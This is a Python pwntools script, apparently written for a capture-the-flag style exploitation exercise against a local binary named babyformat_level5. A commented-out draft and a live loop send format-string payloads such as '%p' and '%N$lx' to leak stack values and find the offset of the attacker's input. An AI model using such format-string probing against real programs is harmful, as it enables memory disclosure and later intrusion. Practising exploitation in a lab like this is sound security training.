# from pwn import *

# # Connect to the target program
# io = process("/challenge/babyformat_level5")

# # Craft the format string exploit
# format_str = b"%p" * 10
# # exploit = b"A" * 32 + format_str
# exploit =  format_str
# # Send the exploit to the target program
# io.sendline(exploit)

# # Receive the output of the target program
# output = io.recvline().strip()
# print(output)
# # Parse the leaked memory addresses from the output
# leaked_addrs = output.split(b" ")

# # Extract the address of the puts function
# puts_addr = int(leaked_addrs[1], 16)

# # Print the address of the puts function
# print("Address of puts function:", hex(puts_addr))

# io.interactive()

# =======

from pwn import *

context.log_level = 'critical'
BINARY = '/challenge/babyformat_level5'

for i in range(2, 50):
    p = process(BINARY)
    p.sendline('AAAA %{}$lx %{}$p'.format(i,i))
    p.recvuntil(b"Your input is:")
    p.recvline()
    print(b'%02d: '%(i) + p.recvline()[:-1]) 
    p.close()

print('loop completed')